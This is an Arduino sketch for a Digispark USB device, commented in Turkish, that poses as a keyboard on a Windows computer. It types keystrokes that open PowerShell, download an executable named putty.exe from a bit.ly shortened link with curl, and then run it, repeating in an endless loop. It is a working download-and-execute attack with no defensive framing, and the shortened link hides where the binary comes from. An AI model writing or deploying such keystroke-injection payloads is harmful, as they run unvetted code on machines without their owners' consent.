#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(100);

DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); // windows+r ye bas
DigiKeyboard.delay(5000);

DigiKeyboard.print("powershell");  //powershell yaz
DigiKeyboard.delay(1000);

DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(5000);

DigiKeyboard.print("curl -o putty.exe https://bit.ly/3Lr4zlc"); //Powershell Putty indirme komutu
DigiKeyboard.delay(5000);

DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(10000);

DigiKeyboard.print("exit");
DigiKeyboard.delay(3000);

DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(3000);

DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(1000);

DigiKeyboard.print("putty.exe");       //putty exe yaz ve çalıştır
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);









}
